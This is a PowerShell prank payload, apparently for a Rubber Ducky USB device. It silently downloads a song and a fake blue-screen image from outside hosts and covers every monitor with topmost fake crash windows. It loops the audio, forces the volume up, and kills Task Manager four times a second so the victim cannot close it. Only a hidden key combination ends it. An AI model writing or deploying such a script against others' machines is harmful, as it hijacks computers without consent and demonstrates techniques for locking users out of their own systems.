# 1. ASSET CONFIGURATION
$mp3Url = "https://qoret.com/dl/uploads/2019/07/Rick_Astley_-_Never_Gonna_Give_You_Up_Qoret.com.mp3"
$pngUrl = "https://raw.githubusercontent.com/the-weeper-jetlearner/the-rickrollforrubberDuckyUSB-ps1/refs/heads/main/bsod.png"

# 2. USER-AGNOSTIC DIRECTORY (Works on all local accounts without Admin)
$workDir = "C:\Users\Public\Music\Cache"
if (!(Test-Path $workDir)) { New-Item -ItemType Directory -Path $workDir -Force }
$mp3 = "$workDir\r.mp3"; $png = "$workDir\b.png"

# 3. SILENT DOWNLOAD
Invoke-WebRequest -Uri $mp3Url -OutFile $mp3 -UseBasicParsing
Invoke-WebRequest -Uri $pngUrl -OutFile $png -UseBasicParsing

# Wait for files to exist and unblock them for playback
while (!(Test-Path $png) -or !(Test-Path $mp3)) { Start-Sleep -s 1 }
Unblock-File -Path $mp3; Unblock-File -Path $png

# 4. LOAD ENGINES
Add-Type -AssemblyName PresentationCore, System.Windows.Forms, System.Drawing

# 5. AUDIO SETUP
$player = New-Object System.Windows.Media.MediaPlayer
$player.Open([Uri]$mp3)
$player.Volume = 1.0

# 6. MULTI-SCREEN BSOD SETUP
$forms = New-Object System.Collections.Generic.List[System.Windows.Forms.Form]
$global:running = $true

foreach ($screen in [System.Windows.Forms.Screen]::AllScreens) {
    $f = New-Object Windows.Forms.Form
    $f.FormBorderStyle = "None"
    $f.TopMost = $true
    $f.ShowInTaskbar = $false
    $f.StartPosition = "Manual"
    $f.Location = $screen.Bounds.Location
    $f.Size = $screen.Bounds.Size
    $f.BackgroundImage = [System.Drawing.Image]::FromFile($png)
    $f.BackgroundImageLayout = "Stretch"
    
    # KILL SWITCH (Ctrl+Shift+F4)
    $f.KeyPreview = $true
    $f.Add_KeyDown({
        if ($_.Control -and $_.Shift -and $_.KeyCode -eq "F4") { $global:running = $false }
    })
    
    $f.Show()
    $forms.Add($f)
}

# 7. MAIN EXECUTION LOOP
$player.Play()
$ws = New-Object -ComObject WScript.Shell

try {
    while ($global:running) {
        # COMBAT CTRL+ALT+DEL: Instantly kill Task Manager if it opens
        Get-Process taskmgr -ErrorAction SilentlyContinue | Stop-Process -Force
        
        # 50% VOLUME CAP: Force to 0, then up to exactly 50%
        for ($i=0; $i -lt 50; $i++) { $ws.SendKeys([char]174) } # Down
        for ($i=0; $i -lt 25; $i++) { $ws.SendKeys([char]175) } # Up
        
        # KEEP BSOD STICKY: Reactivate windows 4 times a second
        foreach ($f in $forms) { 
            $f.Activate()
            $f.TopMost = $true
            [Windows.Forms.Application]::DoEvents() 
        }
        
        # AUDIO LOOP: Restart if the song ends
        if ($player.Position -ge $player.NaturalDuration.TimeSpan) {
            $player.Position = [TimeSpan]::Zero; $player.Play()
        }
        
        Start-Sleep -Milliseconds 250
    }
}
finally {
    # CLEANUP: Closes everything and deletes files on exit
    foreach ($f in $forms) { $f.Close() }
    $player.Stop(); $player.Close()
    Remove-Item -Recurse -Force $workDir
    Stop-Process -Id $PID
}
